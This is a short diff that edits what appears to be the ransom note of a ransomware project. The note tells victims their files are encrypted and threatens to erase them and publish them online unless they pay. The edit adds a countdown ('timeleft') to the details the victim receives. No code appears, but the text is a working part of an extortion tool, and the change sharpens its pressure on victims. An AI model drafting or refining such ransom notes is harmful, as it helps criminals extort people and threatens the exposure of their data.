@@ -5,7 +5,7 @@ Otherwise, your files will be lost
 **********************************
 Your files are encrypted.
 Please pay to unlock your files before we erase it and *PUBLISH* all files on the internet
-You will receive your number and price in a folder.
+You will receive your number price and timeleft in a folder.
 (Ex.YourNumberIs3.txt The given number is 3)
 
 The given number will be the price.
